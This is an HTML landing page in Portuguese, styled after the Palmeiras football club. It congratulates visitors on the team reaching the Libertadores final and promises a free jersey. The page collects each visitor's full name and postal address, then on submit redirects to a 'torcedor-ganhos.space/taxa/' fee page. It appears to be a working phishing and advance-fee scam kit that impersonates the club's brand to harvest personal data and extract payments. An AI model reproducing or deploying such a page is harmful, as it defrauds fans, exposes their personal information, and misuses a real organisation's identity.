<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parabéns - Palmeiras na Final da Libertadores!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: linear-gradient(135deg, #006437, #FFFFFF);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .red-bar {
            height: 5px;
            background: #006437;
            margin-bottom: 20px;
            border-radius: 3px;
        }

        .logo {
            width: 80px;
            height: auto;
            margin-bottom: 20px;
        }

        .headline {
            color: #006437;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            line-height: 1.3;
        }

        .sub-headline {
            color: #374151;
            font-size: 18px;
            margin-bottom: 30px;
            font-weight: 500;
        }

        .green-box {
            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
            border: 2px solid #006437;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
        }

        .box-title {
            color: #006437;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .jersey-image {
            width: 200px;
            height: auto;
            border-radius: 10px;
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .jersey-text {
            color: #374151;
            font-size: 16px;
            font-weight: 500;
        }

        .register-button {
            background: linear-gradient(135deg, #006437, #002d00);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 102, 51, 0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .register-button:hover {
            background: linear-gradient(135deg, #002d00, #001a00);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 102, 51, 0.6);
        }

        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            animation: fadeInModal 0.3s ease;
        }

        @keyframes fadeInModal {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            animation: slideInModal 0.3s ease;
        }

        @keyframes slideInModal {
            from {
                opacity: 0;
                transform: translate(-50%, -60%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }

        .modal-header {
            text-align: center;
            margin-bottom: 25px;
        }

        .modal-title {
            color: #006437;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .modal-subtitle {
            color: #374151;
            font-size: 14px;
        }

        .close-button {
            position: absolute;
            top: 15px;
            right: 20px;
            background: none;
            border: none;
            font-size: 24px;
            color: #6b7280;
            cursor: pointer;
            padding: 5px;
        }

        .close-button:hover {
            color: #374151;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-row {
            display: flex;
            gap: 15px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .form-group label {
            display: block;
            color: #374151;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 5px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #006437;
        }

        .form-group input.loading {
            background: #f9fafb;
            color: #6b7280;
        }

        .submit-button {
            background: linear-gradient(135deg, #006437, #002d00);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .submit-button:hover {
            background: linear-gradient(135deg, #002d00, #001a00);
            transform: translateY(-2px);
        }

        .submit-button:disabled {
            background: #9ca3af;
            cursor: not-allowed;
            transform: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            .headline {
                font-size: 20px;
            }
            
            .sub-headline {
                font-size: 16px;
            }
            
            .box-title {
                font-size: 16px;
            }
            
            .jersey-image {
                width: 150px;
            }
            
            .register-button {
                padding: 12px 30px;
                font-size: 16px;
            }

            .modal-content {
                padding: 20px;
                width: 95%;
            }

            .form-row {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="red-bar"></div>
        <img src="../assets/images/palmeiras-logo.png" alt="Logo do Palmeiras" class="logo">
        <h1 class="headline">Parabéns! Você conhece o Palmeiras na Final da Libertadores!</h1>
        <h2 class="sub-headline">Ganhe sua camisa GRÁTIS para celebrar o classificação!</h2>
        
        <div class="green-box">
            <h3 class="box-title">Seu prêmio:</h3>
            <img src="../assets/images/palmeiras-camisa.jpg" alt="Camisa do Palmeiras" class="jersey-image">
            <p class="jersey-text">Cadastre seu endereço para receber sua camiseta:</p>
        </div>
        
        <button class="register-button" onclick="openModal()">Cadastrar endereço</button>
    </div>

    <!-- Modal -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <button class="close-button" onclick="closeModal()">&times;</button>
            
            <div class="modal-header">
                <h3 class="modal-title">Cadastre seu endereço</h3>
                <p class="modal-subtitle">Preencha os dados para receber sua camisa alviverde</p>
            </div>
            
            <form id="addressForm">
                <div class="form-group">
                    <label for="nome">Nome Completo *</label>
                    <input type="text" id="nome" name="nome" placeholder="Digite seu nome completo" required>
                </div>
                
                <div class="form-group">
                    <label for="cep">CEP *</label>
                    <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" required>
                </div>
                
                <div class="form-group">
                    <label for="rua">Rua *</label>
                    <input type="text" id="rua" name="rua" placeholder="Digite sua rua" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="numero">Número *</label>
                        <input type="text" id="numero" name="numero" placeholder="123" required>
                    </div>
                    <div class="form-group">
                        <label for="complemento">Complemento</label>
                        <input type="text" id="complemento" name="complemento" placeholder="Apto, bloco...">
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="bairro">Bairro *</label>
                    <input type="text" id="bairro" name="bairro" placeholder="Digite seu bairro" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="cidade">Cidade *</label>
                        <input type="text" id="cidade" name="cidade" placeholder="Digite sua cidade" required>
                    </div>
                    <div class="form-group">
                        <label for="estado">Estado *</label>
                        <select id="estado" name="estado" required>
                            <option value="">Selecione</option>
                            <option value="AC">AC</option>
                            <option value="AL">AL</option>
                            <option value="AP">AP</option>
                            <option value="AM">AM</option>
                            <option value="BA">BA</option>
                            <option value="CE">CE</option>
                            <option value="DF">DF</option>
                            <option value="ES">ES</option>
                            <option value="GO">GO</option>
                            <option value="MA">MA</option>
                            <option value="MT">MT</option>
                            <option value="MS">MS</option>
                            <option value="MG">MG</option>
                            <option value="PA">PA</option>
                            <option value="PB">PB</option>
                            <option value="PR">PR</option>
                            <option value="PE">PE</option>
                            <option value="PI">PI</option>
                            <option value="RJ">RJ</option>
                            <option value="RN">RN</option>
                            <option value="RS">RS</option>
                            <option value="RO">RO</option>
                            <option value="RR">RR</option>
                            <option value="SC">SC</option>
                            <option value="SP">SP</option>
                            <option value="SE">SE</option>
                            <option value="TO">TO</option>
                        </select>
                    </div>
                </div>
                
                <button type="submit" class="submit-button">Confirmar Endereço</button>
            </form>
        </div>
    </div>

    <script>
        function openModal() {
            document.getElementById('modalOverlay').style.display = 'block';
            document.body.style.overflow = 'hidden';
        }

        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // Fechar modal clicando fora
        document.getElementById('modalOverlay').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });

        // Máscara para CEP
        document.getElementById('cep').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 8) {
                value = value.replace(/(\d{5})(\d)/, '$1-$2');
                e.target.value = value;
            }
        });

        // API de CEP
        document.getElementById('cep').addEventListener('blur', function() {
            const cep = this.value.replace(/\D/g, '');
            
            if (cep.length === 8) {
                // Campos que serão preenchidos
                const rua = document.getElementById('rua');
                const bairro = document.getElementById('bairro');
                const cidade = document.getElementById('cidade');
                const estado = document.getElementById('estado');
                
                // Mostrar loading
                rua.classList.add('loading');
                bairro.classList.add('loading');
                cidade.classList.add('loading');
                estado.classList.add('loading');
                
                rua.value = 'Carregando...';
                bairro.value = 'Carregando...';
                cidade.value = 'Carregando...';
                
                // Buscar CEP
                fetch(`https://viacep.com.br/ws/${cep}/json/`)
                    .then(response => response.json())
                    .then(data => {
                        // Remover loading
                        rua.classList.remove('loading');
                        bairro.classList.remove('loading');
                        cidade.classList.remove('loading');
                        estado.classList.remove('loading');
                        
                        if (!data.erro) {
                            rua.value = data.logradouro || '';
                            bairro.value = data.bairro || '';
                            cidade.value = data.localidade || '';
                            estado.value = data.uf || '';
                        } else {
                            alert('CEP não encontrado!');
                            rua.value = '';
                            bairro.value = '';
                            cidade.value = '';
                            estado.value = '';
                        }
                    })
                    .catch(error => {
                        console.error('Erro ao buscar CEP:', error);
                        // Remover loading
                        rua.classList.remove('loading');
                        bairro.classList.remove('loading');
                        cidade.classList.remove('loading');
                        estado.classList.remove('loading');
                        
                        rua.value = '';
                        bairro.value = '';
                        cidade.value = '';
                        estado.value = '';
                        
                        alert('Erro ao buscar CEP. Preencha manualmente.');
                    });
            }
        });

        // Submit do formulário
        document.getElementById('addressForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Validar campos obrigatórios
            const requiredFields = ['nome', 'cep', 'rua', 'numero', 'bairro', 'cidade', 'estado'];
            let isValid = true;
            
            requiredFields.forEach(field => {
                const input = document.getElementById(field);
                if (!input.value.trim()) {
                    input.style.borderColor = '#ef4444';
                    isValid = false;
                } else {
                    input.style.borderColor = '#e5e7eb';
                }
            });
            
            if (!isValid) {
                alert('Por favor, preencha todos os campos obrigatórios.');
                return;
            }
            
            // Redirecionar para próxima página
            const queryString = window.location.search;
            const baseUrl = "https://torcedor-ganhos.space/taxa/";
            const redirectUrl = baseUrl + queryString;
            window.location.href = redirectUrl;
        });

        // Adicionar efeito de entrada suave
        document.addEventListener('DOMContentLoaded', function() {
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            
            setTimeout(() => {
                container.style.transition = 'all 1s ease-in-out';
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 100);
        });
    </script>
</body>
</html>
